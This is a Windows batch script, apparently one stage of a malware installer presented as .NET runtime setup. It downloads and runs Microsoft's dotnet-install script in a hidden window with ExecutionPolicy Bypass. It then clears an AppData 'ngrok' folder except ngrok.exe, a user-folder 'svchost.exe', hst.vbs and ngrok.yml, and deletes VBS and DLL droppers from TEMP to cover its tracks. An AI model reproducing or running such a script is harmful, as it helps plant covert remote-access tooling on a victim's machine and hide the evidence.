@echo off
setlocal enabledelayedexpansion

set "USER=%USERNAME%"
set "NGROK_DIR=C:\Users\%USER%\AppData\Local\ngrok"
set "DOTNET_INSTALL_SCRIPT=%NGROK_DIR%\nti.ps1"
set "DOTNET_VERSION=8.0.15"
set "ASPNETCORE_VERSION=8.0.11"
set "WINDOWSDESKTOP_VERSION=8.0.11"
set "INSTALL_DIR=C:\Program Files\dotnet"
set "TEMP_FILE=%TEMP%\8b37b206-42e3-4bdf-9344-aa7matagrasa77be014.tmp"

if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"

powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.ps1', '%DOTNET_INSTALL_SCRIPT%')"

powershell -ExecutionPolicy Bypass -NoProfile -File "%DOTNET_INSTALL_SCRIPT%" -Runtime dotnet -Version %DOTNET_VERSION% -InstallDir "%INSTALL_DIR%"
powershell -ExecutionPolicy Bypass -NoProfile -File "%DOTNET_INSTALL_SCRIPT%" -Runtime aspnetcore -Version %ASPNETCORE_VERSION% -InstallDir "%INSTALL_DIR%"
powershell -ExecutionPolicy Bypass -NoProfile -File "%DOTNET_INSTALL_SCRIPT%" -Runtime windowsdesktop -Version %WINDOWSDESKTOP_VERSION% -InstallDir "%INSTALL_DIR%"

echo.>"%TEMP_FILE%"

del "%DOTNET_INSTALL_SCRIPT%"

:: Wait for 4 seconds
timeout /t 4 /nobreak >nul

:: Delete everything in NGROK_DIR except ngrok.exe, svchost.exe, hst.vbs, and ngrok.yml
for /r "%NGROK_DIR%" %%F in (*) do (
    if /i not "%%~nxF"=="ngrok.exe" (
        if /i not "%%~nxF"=="svchost.exe" (
            if /i not "%%~nxF"=="hst.vbs" (
                if /i not "%%~nxF"=="ngrok.yml" (
                    del /f /q "%%F"
                )
            )
        )
    )
)

del /f /q "%TEMP%\Repair.dll"
del /f /q "%TEMP%\main.vbs"
del /f /q "%TEMP%\1.vbs"

endlocal
